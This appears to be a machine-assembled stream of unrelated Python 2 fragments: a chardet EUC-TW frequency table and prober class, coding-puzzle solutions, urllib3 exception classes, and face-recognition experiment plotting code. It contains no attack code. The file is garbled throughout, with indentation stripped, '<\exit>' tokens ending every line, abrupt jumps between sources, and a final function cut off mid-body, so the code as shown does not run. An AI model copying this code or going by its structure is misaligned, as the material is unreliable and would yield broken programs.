7899,4523,2767,3230, 576, 530,1362,7900,4524,2533,2666,3710,4017,7901, 842,3834,<\exit>
7902,2801,2031,1014,4018, 213,2700,3376, 665, 621,4236,7903,3711,2925,2430,7904,<\exit>
2431,3302,3588,3377,7905,4237,2534,4238,4525,3589,1682,4239,3484,1380,7906, 724,<\exit>
2277, 600,1670,7907,1337,1233,4526,3103,2244,7908,1621,4527,7909, 651,4240,7910,<\exit>
1612,4241,2611,7911,2844,7912,2734,2307,3058,7913, 716,2459,3059, 174,1255,2701,<\exit>
4019,3590, 548,1320,1398, 728,4020,1574,7914,1890,1197,3060,4021,7915,3061,3062,<\exit>
3712,3591,3713, 747,7916, 635,4242,4528,7917,7918,7919,4243,7920,7921,4529,7922,<\exit>
3378,4530,2432, 451,7923,3714,2535,2072,4244,2735,4245,4022,7924,1764,4531,7925,<\exit>
4246, 350,7926,2278,2390,2486,7927,4247,4023,2245,1434,4024, 488,4532, 458,4248,<\exit>
4025,3715, 771,1330,2391,3835,2568,3159,2159,2409,1553,2667,3160,4249,7928,2487,<\exit>
2881,2612,1720,2702,4250,3379,4533,7929,2536,4251,7930,3231,4252,2768,7931,2015,<\exit>
2736,7932,1155,1017,3716,3836,7933,3303,2308, 201,1864,4253,1430,7934,4026,7935,<\exit>
7936,7937,7938,7939,4254,1604,7940, 414,1865, 371,2587,4534,4535,3485,2016,3104,<\exit>
4536,1708, 960,4255, 887, 389,2171,1536,1663,1721,7941,2228,4027,2351,2926,1580,<\exit>
7942,7943,7944,1744,7945,2537,4537,4538,7946,4539,7947,2073,7948,7949,3592,3380,<\exit>
2882,4256,7950,4257,2640,3381,2802, 673,2703,2460, 709,3486,4028,3593,4258,7951,<\exit>
1148, 502, 634,7952,7953,1204,4540,3594,1575,4541,2613,3717,7954,3718,3105, 948,<\exit>
3232, 121,1745,3837,1110,7955,4259,3063,2509,3009,4029,3719,1151,1771,3838,1488,<\exit>
4030,1986,7956,2433,3487,7957,7958,2093,7959,4260,3839,1213,1407,2803, 531,2737,<\exit>
2538,3233,1011,1537,7960,2769,4261,3106,1061,7961,3720,3721,1866,2883,7962,2017,<\exit>
120,4262,4263,2062,3595,3234,2309,3840,2668,3382,1954,4542,7963,7964,3488,1047,<\exit>
2704,1266,7965,1368,4543,2845, 649,3383,3841,2539,2738,1102,2846,2669,7966,7967,<\exit>
1999,7968,1111,3596,2962,7969,2488,3842,3597,2804,1854,3384,3722,7970,7971,3385,<\exit>
2410,2884,3304,3235,3598,7972,2569,7973,3599,2805,4031,1460, 856,7974,3600,7975,<\exit>
2885,2963,7976,2886,3843,7977,4264, 632,2510, 875,3844,1697,3845,2291,7978,7979,<\exit>
4544,3010,1239, 580,4545,4265,7980, 914, 936,2074,1190,4032,1039,2123,7981,7982,<\exit>
7983,3386,1473,7984,1354,4266,3846,7985,2172,3064,4033, 915,3305,4267,4268,3306,<\exit>
1605,1834,7986,2739, 398,3601,4269,3847,4034, 328,1912,2847,4035,3848,1331,4270,<\exit>
3011, 937,4271,7987,3602,4036,4037,3387,2160,4546,3388, 524, 742, 538,3065,1012,<\exit>
7988,7989,3849,2461,7990, 658,1103, 225,3850,7991,7992,4547,7993,4548,7994,3236,<\exit>
1243,7995,4038, 963,2246,4549,7996,2705,3603,3161,7997,7998,2588,2327,7999,4550,<\exit>
8000,8001,8002,3489,3307, 957,3389,2540,2032,1930,2927,2462, 870,2018,3604,1746,<\exit>
2770,2771,2434,2463,8003,3851,8004,3723,3107,3724,3490,3390,3725,8005,1179,3066,<\exit>
8006,3162,2373,4272,3726,2541,3163,3108,2740,4039,8007,3391,1556,2542,2292, 977,<\exit>
2887,2033,4040,1205,3392,8008,1765,3393,3164,2124,1271,1689, 714,4551,3491,8009,<\exit>
2328,3852, 533,4273,3605,2181, 617,8010,2464,3308,3492,2310,8011,8012,3165,8013,<\exit>
8014,3853,1987, 618, 427,2641,3493,3394,8015,8016,1244,1690,8017,2806,4274,4552,<\exit>
8018,3494,8019,8020,2279,1576, 473,3606,4275,3395, 972,8021,3607,8022,3067,8023,<\exit>
8024,4553,4554,8025,3727,4041,4042,8026, 153,4555, 356,8027,1891,2888,4276,2143,<\exit>
408, 803,2352,8028,3854,8029,4277,1646,2570,2511,4556,4557,3855,8030,3856,4278,<\exit>
8031,2411,3396, 752,8032,8033,1961,2964,8034, 746,3012,2465,8035,4279,3728, 698,<\exit>
4558,1892,4280,3608,2543,4559,3609,3857,8036,3166,3397,8037,1823,1302,4043,2706,<\exit>
3858,1973,4281,8038,4282,3167, 823,1303,1288,1236,2848,3495,4044,3398, 774,3859,<\exit>
8039,1581,4560,1304,2849,3860,4561,8040,2435,2161,1083,3237,4283,4045,4284, 344,<\exit>
1173, 288,2311, 454,1683,8041,8042,1461,4562,4046,2589,8043,8044,4563, 985, 894,<\exit>
8045,3399,3168,8046,1913,2928,3729,1988,8047,2110,1974,8048,4047,8049,2571,1194,<\exit>
425,8050,4564,3169,1245,3730,4285,8051,8052,2850,8053, 636,4565,1855,3861, 760,<\exit>
1799,8054,4286,2209,1508,4566,4048,1893,1684,2293,8055,8056,8057,4287,4288,2210,<\exit>
479,8058,8059, 832,8060,4049,2489,8061,2965,2490,3731, 990,3109, 627,1814,2642,<\exit>
4289,1582,4290,2125,2111,3496,4567,8062, 799,4291,3170,8063,4568,2112,1737,3013,<\exit>
1018, 543, 754,4292,3309,1676,4569,4570,4050,8064,1489,8065,3497,8066,2614,2889,<\exit>
4051,8067,8068,2966,8069,8070,8071,8072,3171,4571,4572,2182,1722,8073,3238,3239,<\exit>
1842,3610,1715, 481, 365,1975,1856,8074,8075,1962,2491,4573,8076,2126,3611,3240,<\exit>
433,1894,2063,2075,8077, 602,2741,8078,8079,8080,8081,8082,3014,1628,3400,8083,<\exit>
3172,4574,4052,2890,4575,2512,8084,2544,2772,8085,8086,8087,3310,4576,2891,8088,<\exit>
4577,8089,2851,4578,4579,1221,2967,4053,2513,8090,8091,8092,1867,1989,8093,8094,<\exit>
8095,1895,8096,8097,4580,1896,4054, 318,8098,2094,4055,4293,8099,8100, 485,8101,<\exit>
938,3862, 553,2670, 116,8102,3863,3612,8103,3498,2671,2773,3401,3311,2807,8104,<\exit>
3613,2929,4056,1747,2930,2968,8105,8106, 207,8107,8108,2672,4581,2514,8109,3015,<\exit>
890,3614,3864,8110,1877,3732,3402,8111,2183,2353,3403,1652,8112,8113,8114, 941,<\exit>
2294, 208,3499,4057,2019, 330,4294,3865,2892,2492,3733,4295,8115,8116,8117,8118,<\exit>
2515,1613,4582,8119,3312,3866,2516,8120,4058,8121,1637,4059,2466,4583,3867,8122,<\exit>
2493,3016,3734,8123,8124,2192,8125,8126,2162,8127,8128,8129,8130,8131,8132,8133,<\exit>
8134,8135,8136,8137,8138,8139,8140,8141,8142,8143,8144,8145,8146,8147,8148,8149,<\exit>
8150,8151,8152,8153,8154,8155,8156,8157,8158,8159,8160,8161,8162,8163,8164,8165,<\exit>
8166,8167,8168,8169,8170,8171,8172,8173,8174,8175,8176,8177,8178,8179,8180,8181,<\exit>
8182,8183,8184,8185,8186,8187,8188,8189,8190,8191,8192,8193,8194,8195,8196,8197,<\exit>
8198,8199,8200,8201,8202,8203,8204,8205,8206,8207,8208,8209,8210,8211,8212,8213,<\exit>
8214,8215,8216,8217,8218,8219,8220,8221,8222,8223,8224,8225,8226,8227,8228,8229,<\exit>
8230,8231,8232,8233,8234,8235,8236,8237,8238,8239,8240,8241,8242,8243,8244,8245,<\exit>
8246,8247,8248,8249,8250,8251,8252,8253,8254,8255,8256,8257,8258,8259,8260,8261,<\exit>
8262,8263,8264,8265,8266,8267,8268,8269,8270,8271,8272,8273,8274,8275,8276,8277,<\exit>
8278,8279,8280,8281,8282,8283,8284,8285,8286,8287,8288,8289,8290,8291,8292,8293,<\exit>
8294,8295,8296,8297,8298,8299,8300,8301,8302,8303,8304,8305,8306,8307,8308,8309,<\exit>
8310,8311,8312,8313,8314,8315,8316,8317,8318,8319,8320,8321,8322,8323,8324,8325,<\exit>
8326,8327,8328,8329,8330,8331,8332,8333,8334,8335,8336,8337,8338,8339,8340,8341,<\exit>
8342,8343,8344,8345,8346,8347,8348,8349,8350,8351,8352,8353,8354,8355,8356,8357,<\exit>
8358,8359,8360,8361,8362,8363,8364,8365,8366,8367,8368,8369,8370,8371,8372,8373,<\exit>
8374,8375,8376,8377,8378,8379,8380,8381,8382,8383,8384,8385,8386,8387,8388,8389,<\exit>
8390,8391,8392,8393,8394,8395,8396,8397,8398,8399,8400,8401,8402,8403,8404,8405,<\exit>
8406,8407,8408,8409,8410,8411,8412,8413,8414,8415,8416,8417,8418,8419,8420,8421,<\exit>
8422,8423,8424,8425,8426,8427,8428,8429,8430,8431,8432,8433,8434,8435,8436,8437,<\exit>
8438,8439,8440,8441,8442,8443,8444,8445,8446,8447,8448,8449,8450,8451,8452,8453,<\exit>
8454,8455,8456,8457,8458,8459,8460,8461,8462,8463,8464,8465,8466,8467,8468,8469,<\exit>
8470,8471,8472,8473,8474,8475,8476,8477,8478,8479,8480,8481,8482,8483,8484,8485,<\exit>
8486,8487,8488,8489,8490,8491,8492,8493,8494,8495,8496,8497,8498,8499,8500,8501,<\exit>
8502,8503,8504,8505,8506,8507,8508,8509,8510,8511,8512,8513,8514,8515,8516,8517,<\exit>
8518,8519,8520,8521,8522,8523,8524,8525,8526,8527,8528,8529,8530,8531,8532,8533,<\exit>
8534,8535,8536,8537,8538,8539,8540,8541,8542,8543,8544,8545,8546,8547,8548,8549,<\exit>
8550,8551,8552,8553,8554,8555,8556,8557,8558,8559,8560,8561,8562,8563,8564,8565,<\exit>
8566,8567,8568,8569,8570,8571,8572,8573,8574,8575,8576,8577,8578,8579,8580,8581,<\exit>
8582,8583,8584,8585,8586,8587,8588,8589,8590,8591,8592,8593,8594,8595,8596,8597,<\exit>
8598,8599,8600,8601,8602,8603,8604,8605,8606,8607,8608,8609,8610,8611,8612,8613,<\exit>
8614,8615,8616,8617,8618,8619,8620,8621,8622,8623,8624,8625,8626,8627,8628,8629,<\exit>
8630,8631,8632,8633,8634,8635,8636,8637,8638,8639,8640,8641,8642,8643,8644,8645,<\exit>
8646,8647,8648,8649,8650,8651,8652,8653,8654,8655,8656,8657,8658,8659,8660,8661,<\exit>
8662,8663,8664,8665,8666,8667,8668,8669,8670,8671,8672,8673,8674,8675,8676,8677,<\exit>
8678,8679,8680,8681,8682,8683,8684,8685,8686,8687,8688,8689,8690,8691,8692,8693,<\exit>
8694,8695,8696,8697,8698,8699,8700,8701,8702,8703,8704,8705,8706,8707,8708,8709,<\exit>
8710,8711,8712,8713,8714,8715,8716,8717,8718,8719,8720,8721,8722,8723,8724,8725,<\exit>
8726,8727,8728,8729,8730,8731,8732,8733,8734,8735,8736,8737,8738,8739,8740,8741)<\exit>
from .mbcharsetprober import MultiByteCharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .chardistribution import EUCTWDistributionAnalysis<\exit>
from .mbcssm import EUCTWSMModel<\exit>
class EUCTWProber(MultiByteCharSetProber):<\exit>
def __init__(self):<\exit>
MultiByteCharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(EUCTWSMModel)<\exit>
self._mDistributionAnalyzer = EUCTWDistributionAnalysis()<\exit>
self.reset()<\exit>
def get_charset_name(self):<\exit>
return "EUC-TW"<\exit>
class Solution:<\exit>
def evalRPN(self, tokens):<\exit>
return self.eval_postfix(tokens)<\exit>
def eval_postfix(self, post):<\exit>
stk = []<\exit>
for elt in post:<\exit>
if elt.strip("-").isdigit():<\exit>
stk.append(int(elt))<\exit>
else:<\exit>
b = stk.pop()<\exit>
a = stk.pop()<\exit>
if elt == "+":<\exit>
stk.append(a+b)<\exit>
elif elt == "-":<\exit>
stk.append(a-b)<\exit>
elif elt == "*":<\exit>
stk.append(a*b)<\exit>
else:<\exit>
stk.append(self.__div(a, b))<\exit>
if stk:<\exit>
return stk[-1]<\exit>
return 0<\exit>
def __div(self, a, b):<\exit>
sign = 1<\exit>
if a*b < 0:<\exit>
sign = -1<\exit>
return abs(a)/abs(b)*sign<\exit>
class Solution(object):<\exit>
def __init__(self, N, M):<\exit>
self.f = [0 for _ in xrange(N + 1)]<\exit>
self.V = [[] for _ in xrange(N + 1)]<\exit>
self.E = []<\exit>
def solve(self, cipher):<\exit>
N, M, E = cipher<\exit>
for e in E:<\exit>
u, v = e<\exit>
self.E.append([u, v])<\exit>
self.V[u].append(v)<\exit>
self.V[v].append(u)<\exit>
self.get_sum(1, 0)<\exit>
result = 0<\exit>
for i in xrange(2, N + 1):<\exit>
if self.f[i] % 2 == 0:<\exit>
result += 1<\exit>
return result<\exit>
def get_sum(self, cur, pi):<\exit>
if self.f[cur] == 0:<\exit>
for nigh in self.V[cur]:<\exit>
if nigh != pi:<\exit>
self.f[cur] += self.get_sum(nigh, cur)<\exit>
self.f[cur] += 1<\exit>
return self.f[cur]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, M = map(int, f.readline().strip().split(' '))<\exit>
solution = Solution(N, M)<\exit>
E = []<\exit>
for t in xrange(M):<\exit>
E.append(map(int, f.readline().strip().split(' ')))<\exit>
cipher = N, M, E<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
cpp_examples = [<\exit>
("wimax-simple", "True", "True"),<\exit>
("wimax-ipv4", "True", "True"),<\exit>
("wimax-multicast", "True", "True"),<\exit>
]<\exit>
python_examples = []<\exit>
class HTTPError(Exception):<\exit>
"Base exception used by this module."<\exit>
pass<\exit>
class PoolError(HTTPError):<\exit>
"Base exception for errors caused within a pool."<\exit>
def __init__(self, pool, message):<\exit>
self.pool = pool<\exit>
HTTPError.__init__(self, "%s: %s" % (pool, message))<\exit>
def __reduce__(self):<\exit>
return self.__class__, (None, self.url)<\exit>
class SSLError(HTTPError):<\exit>
"Raised when SSL certificate fails in an HTTPS connection."<\exit>
pass<\exit>
class DecodeError(HTTPError):<\exit>
"Raised when automatic decoding based on Content-Type fails."<\exit>
pass<\exit>
class MaxRetryError(PoolError):<\exit>
"Raised when the maximum number of retries is exceeded."<\exit>
def __init__(self, pool, url, reason=None):<\exit>
self.reason = reason<\exit>
message = "Max retries exceeded with url: %s" % url<\exit>
if reason:<\exit>
message += " (Caused by %s: %s)" % (type(reason), reason)<\exit>
else:<\exit>
message += " (Caused by redirect)"<\exit>
PoolError.__init__(self, pool, message)<\exit>
self.url = url<\exit>
class HostChangedError(PoolError):<\exit>
"Raised when an existing pool gets a request for a foreign host."<\exit>
def __init__(self, pool, url, retries=3):<\exit>
message = "Tried to open a foreign host with url: %s" % url<\exit>
PoolError.__init__(self, pool, message)<\exit>
self.url = url<\exit>
self.retries = retries<\exit>
class TimeoutError(PoolError):<\exit>
"Raised when a socket timeout occurs."<\exit>
pass<\exit>
class EmptyPoolError(PoolError):<\exit>
"Raised when a pool runs out of connections and no more are allowed."<\exit>
pass<\exit>
class ClosedPoolError(PoolError):<\exit>
"Raised when a request enters a pool after the pool has been closed."<\exit>
pass<\exit>
class LocationParseError(ValueError, HTTPError):<\exit>
"Raised when get_host or similar fails to parse the URL input."<\exit>
def __init__(self, location):<\exit>
message = "Failed to parse: %s" % location<\exit>
HTTPError.__init__(self, message)<\exit>
self.location = location<\exit>
from experiment_setup import *<\exit>
import numpy as np<\exit>
from expr.kernelpca_ski import KPCA<\exit>
from util.commons_util.decorators.general import print_func_name<\exit>
class Plotter(object):<\exit>
def __init__(self):<\exit>
pass<\exit>
def _plot(self, models, dist_metric=EuclideanDistance()):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
for model in models:<\exit>
cv = expr.experiment(model, threshold_up=1, debug=False, dist_metric=dist_metric)<\exit>
expr.plot_roc(cv)<\exit>
expr.show_plot()<\exit>
def _simple_run(self, models, dist_metric=EuclideanDistance()):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
for model in models:<\exit>
expr.experiment(model, threshold_up=0, debug=False, dist_metric=dist_metric)<\exit>
class PlotterPCA(Plotter):<\exit>
def plot_components(self):<\exit>
models = []<\exit>
for num_component in xrange(10, 150, 30):<\exit>
models.append(PCA(num_component))<\exit>
self._plot(models)<\exit>
def plot_energy(self):<\exit>
models = []<\exit>
class PCA_energy(PCA):<\exit>
def short_name(self):<\exit>
return "PCA: %.2f%%" % (self.energy_percentage * 100)<\exit>
for num_component in xrange(20, 110, 40):<\exit>
models.append(PCA_energy(num_component))<\exit>
self._plot(models)<\exit>
class PlotterFisher(Plotter):<\exit>
def plot_components(self):<\exit>
models = []<\exit>
for num_components in xrange(1, 16, 3):<\exit>
models.append(Fisherfaces(num_components))<\exit>
self._plot(models)<\exit>
class PlotterKnn(object):<\exit>
def plot_kNN(self):<\exit>
pca = PCA(40)<\exit>
expr = Experiment()<\exit>
plt.figure("PCA precision for different k in kNN")<\exit>
plt.xlabel("k of kNN")<\exit>
plt.ylabel("precision")<\exit>
xys = []<\exit>
for k in xrange(1, 41):<\exit>
cv = expr.experiment(pca, threshold_up=0, kNN_k=k, debug=False)<\exit>
xys.append((k, cv.validation_results[0].precision))<\exit>
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])<\exit>
plt.show()<\exit>
class PlotterLgbphs(Plotter):<\exit>
def _plot(self, models):<\exit>
super(PlotterLgbphs, self)._plot(models, HistogramIntersection())<\exit>
@print_func_name<\exit>
def plot_lbp_algorihtms(self):<\exit>
class LgbphsSub(LGBPHS2):<\exit>
def short_name(self):<\exit>
return "%s" % self.feature.model2.lbp_operator.short_name()<\exit>
models = []<\exit>
for lbp in (OriginalLBP(), ExtendedLBP(radius=6)):<\exit>
models.append(LgbphsSub(lbp_operator=lbp))<\exit>
self._plot(models)<\exit>
@print_func_name<\exit>
def plot_gabor(self):<\exit>
class LgbphsSub(LGBPHS2):<\exit>
def short_name(self):<\exit>
return "LGBPHS"<\exit>
models = [LgbphsSub(lbp_operator=ExtendedLBP(3)),<\exit>
SpatialHistogram(lbp_operator=ExtendedLBP(3))<\exit>
]<\exit>
self._plot(models)<\exit>
@print_func_name<\exit>
def plot_scales(self, r=xrange(1, 10, 4)):<\exit>
class LgbphsSub(LGBPHS2):<\exit>
def short_name(self):<\exit>
return "scale: %s" % self.feature.model1.scale_cnt<\exit>
self._plot([LgbphsSub(n_scale=i, lbp_operator=ExtendedLBP(3)) for i in r])<\exit>
@print_func_name<\exit>
def get_precision_scales(self, r=xrange(1, 10, 4)):<\exit>
self._simple_run([LGBPHS2(n_scale=i, lbp_operator=ExtendedLBP(3)) for i in r])<\exit>
@print_func_name<\exit>
def plot_orientations(self, r=xrange(2, 9, 3)):<\exit>
class LgbphsSub(LGBPHS2):<\exit>
def short_name(self):<\exit>
return "orient: %s" % self.feature.model1.orient_cnt<\exit>
self._plot([LgbphsSub(n_orient=i, lbp_operator=ExtendedLBP(3)) for i in r])<\exit>
@print_func_name<\exit>
def get_precisions_orientations(self, r=xrange(2, 9, 3)):<\exit>
self._simple_run([LGBPHS2(n_orient=i, lbp_operator=ExtendedLBP(3)) for i in r])<\exit>
def plot_histogram(self):<\exit>
pass<\exit>
class PlotterKernelPCA(Plotter):<\exit>
def plot_rbf(self, r=(10000.0 / (200 * 200), 0.5, 0.75, 1.0)):<\exit>
class KPCASub(KPCA):<\exit>
def short_name(self):<\exit>
return "%s, gamma=%.4f" % (self._kernel, self._gamma)<\exit>
self._plot([KPCASub(kernel="rbf", gamma=i) for i in r])<\exit>
def plot_poly_degree(self):<\exit>
models = []<\exit>
class KPCA_poly(KPCA):<\exit>
def short_name(self):<\exit>
return "poly (degree: %d)" % self._degree<\exit>
for degree in xrange(1, 6):<\exit>
models.append(KPCA_poly(50, "poly", degree))<\exit>
self._plot(models)<\exit>
def plot_poly_degree_precisions(self):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
plt.figure("Kernel PCA precision for different number of degrees")<\exit>
plt.xlabel("number of degrees")<\exit>
plt.ylabel("precision")<\exit>
class KPCA_poly(KPCA):<\exit>
def short_name(self):<\exit>
return "poly (degree: %d)" % self._degree<\exit>
xys = []<\exit>
for degree in (1, 4):<\exit>
cv = expr.experiment(KPCA_poly(10, "poly", degree), threshold_up=0, debug=False)<\exit>
xys.append((degree, cv.validation_results[0].precision))<\exit>
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])<\exit>
plt.show()<\exit>
def plot_kernels(self):<\exit>
kernels = ["poly", "sigmoid", "cosine", "rbf"]<\exit>
models = []<\exit>
for kernel in kernels:<\exit>
models.append(KPCA(50, kernel))<\exit>
self._plot(models)<\exit>
def plot_poly_coef0(self, r=(0.0, 20.0, 40.0, 60.0, 80.0)):<\exit>
class KPCA_coef0(KPCA):<\exit>
def short_name(self):<\exit>
return "poly (coef0: %.2f)" % self._coef0<\exit>
self._plot([KPCA_coef0(kernel="poly", coef0=i) for i in r])<\exit>
def plot_poly_gamma(self, r=(10.0, 40.0, 70.0, 100.0, 130.0)):<\exit>
class KPCA_gamma(KPCA):<\exit>
def short_name(self):<\exit>
return "poly (gamma: %.2f)" % self._gamma<\exit>
self._plot([KPCA_gamma(kernel="poly", gamma=i) for i in r])<\exit>
def plot_sigmoid(self, r=(10.0, 20.0, 30.0, 40.0, 50.0)):<\exit>
class KPCA_sigmoid(KPCA):<\exit>
def short_name(self):<\exit>
return "sigmoid (gamma: %.2f)" % self._gamma<\exit>
self._plot([KPCA_sigmoid(kernel="sigmoid", gamma=i) for i in r])<\exit>
class PlotterEnsemble(Plotter):<\exit>
def plot_fisher(self):<\exit>
expr = FeaturesEnsembleExperiment(froze_shuffle=True)<\exit>
plt.axis([0, 0.5, 0.9, 1.001])<\exit>
class LbpFisherSub(LbpFisher):<\exit>
def short_name(self):<\exit>
return "EnsembleLbpFisher"<\exit>
features = [LbpFisherSub(ExtendedLBP(i)) for i in (3, 6, 10, 11, 14, 15, 19)]<\exit>
cv = expr.experiment(features, threshold_up=1, debug=False)<\exit>
expr.plot_roc(cv)<\exit>
features = [LbpFisher(ExtendedLBP(11))]<\exit>
cv = expr.experiment(features, threshold_up=1, debug=False)<\exit>
expr.plot_roc(cv)<\exit>
class FisherfacesSub(Fisherfaces):<\exit>
def short_name(self):<\exit>
return "Fisher"<\exit>
features = [FisherfacesSub(14)]<\exit>
cv = expr.experiment(features, threshold_up=1, debug=False)<\exit>
expr.plot_roc(cv)<\exit>
expr.show_plot()<\exit>
class IdentityFold(Identity):<\exit>
def __init__(self, k):<\exit>
self.k = k<\exit>
super(IdentityFold, self).__init__()<\exit>
def short_name(self):<\exit>
return "folds - %d" % self.k<\exit>
class PCAFold(PCA):<\exit>
def __init__(self, k, num_components):<\exit>
self.k = k<\exit>
super(PCAFold, self).__init__(num_components)<\exit>
def short_name(self):<\exit>
return "folds - %d" % self.k<\exit>
class FisherFold(Fisherfaces):<\exit>
def __init__(self, k, num_components):<\exit>
self.k = k<\exit>
super(FisherFold, self).__init__(num_components)<\exit>
def short_name(self):<\exit>
return "folds - %d" % self.k<\exit>
class Plotter1NN(Plotter):<\exit>
def plot_1NN(self):<\exit>
expr = Experiment()<\exit>
for number_folds in xrange(2, 12, 1):<\exit>
cv = expr.experiment(IdentityFold(number_folds), threshold_up=1, number_folds=number_folds, debug=False)<\exit>
expr.plot_roc(cv)<\exit>
expr.show_plot()<\exit>
def plot_1NN_PCA(self):<\exit>
expr = Experiment()<\exit>
class PCASub(PCA):<\exit>
def __init__(self, k, num_components):<\exit>
self.k = k<\exit>
super(PCASub, self).__init__(num_components)<\exit>
def short_name(self):<\exit>
return "folds - %d" % self.k<\exit>
for number_folds in xrange(2, 12, 1):<\exit>
cv = expr.experiment(PCASub(number_folds, 50), threshold_up=1, number_folds=number_folds, debug=False)<\exit>
expr.plot_roc(cv)<\exit>
expr.show_plot()<\exit>
def plot_1NN_Identity_Precisions(self):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
plt.figure("No reduction, precision for different number of folds")<\exit>
plt.xlabel("number of folds")<\exit>
plt.ylabel("precision")<\exit>
xys = []<\exit>
for number_folds in xrange(2, 12, 1):<\exit>
cv = expr.experiment(IdentityFold(number_folds), threshold_up=0, number_folds=number_folds, debug=False)<\exit>
xys.append((number_folds, cv.validation_results[0].precision))<\exit>
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])<\exit>
plt.show()<\exit>
def plot_1NN_PCA_Precisions(self):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
plt.figure("PCA precision for different number of folds")<\exit>
plt.xlabel("number of folds")<\exit>
plt.ylabel("precision")<\exit>
xys = []<\exit>
for number_folds in xrange(2, 12, 1):<\exit>
cv = expr.experiment(PCAFold(number_folds, 40), threshold_up=0, number_folds=number_folds, debug=False)<\exit>
xys.append((number_folds, cv.validation_results[0].precision))<\exit>
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])<\exit>
plt.show()<\exit>
def plot_1NN_fisher_precisions(self):<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
plt.figure("Fisher precision for different number of folds")<\exit>
plt.xlabel("number of folds")<\exit>
plt.ylabel("precision")<\exit>
xys = []<\exit>
for number_folds in xrange(2, 12, 1):<\exit>
cv = expr.experiment(FisherFold(number_folds, 14), threshold_up=0, number_folds=number_folds, debug=False)<\exit>
xys.append((number_folds, cv.validation_results[0].precision))<\exit>
plt.plot([elt[0] for elt in xys], [elt[1] for elt in xys])<\exit>
plt.show()<\exit>
if __name__ == "__main__":<\exit>
print __file__<\exit>
import sys<\exit>
from expr.weighted_hs import WeightedLGBPHS<\exit>
from facerec_py.facerec.distance import *<\exit>
from facerec_py.facerec.classifier import NearestNeighbor, SVM<\exit>
from facerec_py.facerec.model import PredictableModel, FeaturesEnsemblePredictableModel<\exit>
from facerec_py.facerec.validation import KFoldCrossValidation, shuffle<\exit>
from facerec_py.facerec.visual import subplot<\exit>
from facerec_py.facerec.util import minmax_normalize<\exit>
from expr.read_dataset import read_images<\exit>
import matplotlib.cm as cm<\exit>
import matplotlib.pyplot as plt<\exit>
from expr.feature import *<\exit>
from util.commons_util.logger_utils.logger_factory import LoggerFactory<\exit>
from scipy.interpolate import spline<\exit>
import numpy as np<\exit>
class Drawer(object):<\exit>
def __init__(self, smooth=False):<\exit>
plt.figure("ROC")<\exit>
plt.axis([0, 0.5, 0.5, 1.001])<\exit>
plt.xlabel('FPR')<\exit>
plt.ylabel('TPR')<\exit>
plt.rc('axes', color_cycle=['r', 'g', 'b', 'c', 'm', 'y', 'k',<\exit>
'darkgreen', 'chocolate', 'darksalmon', 'darkseagreen', 'yellowgreen'])<\exit>
self.is_smooth = smooth<\exit>
self._rocs = []<\exit>
def show(self):<\exit>
plt.legend(handles=self._rocs)<\exit>
plt.show()<\exit>
def plot_roc(self, cv):<\exit>
FPRs = [r.FPR for r in cv.validation_results]<\exit>
TPRs = [r.TPR for r in cv.validation_results]<\exit>
FPRs.append(0.0)<\exit>
TPRs.append(0.0)<\exit>
FPRs.append(1.0)<\exit>
TPRs.append(1.0)<\exit>
if self.is_smooth:<\exit>
FPRs, TPRs = self.smooth(FPRs, TPRs)<\exit>
roc, = plt.plot(FPRs, TPRs, label=cv.model.feature.short_name())<\exit>
self._rocs.append(roc)<\exit>
def smooth(self, x, y):<\exit>
x = np.array(x)<\exit>
y = np.array(y)<\exit>
x, idx = np.unique(x, return_index=True)<\exit>
y = y[idx]<\exit>
x_sm = np.linspace(x.min(), x.max(), 60)<\exit>
y_sm = spline(x, y, x_sm)<\exit>
return x_sm, y_sm<\exit>
class Experiment(object):<\exit>
def __init__(self, smooth=False, froze_shuffle=False):<\exit>
self.logger = LoggerFactory().getConsoleLogger("facerec")<\exit>
self._drawer = Drawer(smooth)<\exit>
self.X, self.y = shuffle(*self.read())<\exit>
self.froze_shuffle = froze_shuffle<\exit>
def read(self):<\exit>
out_dir = None<\exit>
if len(sys.argv) < 2:<\exit>
print "USAGE: experiment_setup.py </path/to/images>"<\exit>
sys.exit()<\exit>
X, y = read_images(sys.argv[1])<\exit>
X = np.asarray(X)<\exit>
y = np.asarray(y)<\exit>
return X, y<\exit>
def plot_fisher_original(self, X, model):<\exit>
E = []<\exit>
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):<\exit>
e = model.feature.eigenvectors[:, i].reshape(X[0].shape)<\exit>
E.append(minmax_normalize(e, 0, 255, dtype=np.uint8))<\exit>
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet,<\exit>
filename="fisherfaces.png")<\exit>
plt.close()<\exit>
def plot_fisher(self, X, model, r=3, c=5):<\exit>
E = []<\exit>
for i in xrange(min(model.feature.eigenvectors.shape[1], r*c)):<\exit>
e = model.feature.eigenvectors[:, i].reshape(X[0].shape)<\exit>
E.append(minmax_normalize(e, 0, 255, dtype=np.uint8))<\exit>
subplot(title="Fisherface Components", images=E, rows=r, cols=c, sptitle="fisherface", colormap=cm.rainbow,<\exit>
filename="fisherfaces.png")<\exit>
plt.close()<\exit>
def experiment(self, feature=Fisherfaces(), plot=None, dist_metric=EuclideanDistance(), threshold_up=0, kNN_k=1, number_folds=None, debug=True):<\exit>
classifier = NearestNeighbor(dist_metric=dist_metric, k=kNN_k)<\exit>
model = self._get_model(feature, classifier)<\exit>
model.compute(self.X, self.y)<\exit>
if plot:<\exit>
plot(self.X, model)<\exit>
if number_folds is None:<\exit>
number_folds = len(np.unique(self.y))<\exit>
if number_folds>15: number_folds = 10<\exit>
cv = KFoldCrossValidation(model, k=number_folds, threshold_up=threshold_up, froze_shuffle=self.froze_shuffle, debug=debug)<\exit>
cv.validate(self.X, self.y)<\exit>
print cv<\exit>
if debug:<\exit>
self.logger.info("Cross validation completed; press any key on any image to continue")<\exit>
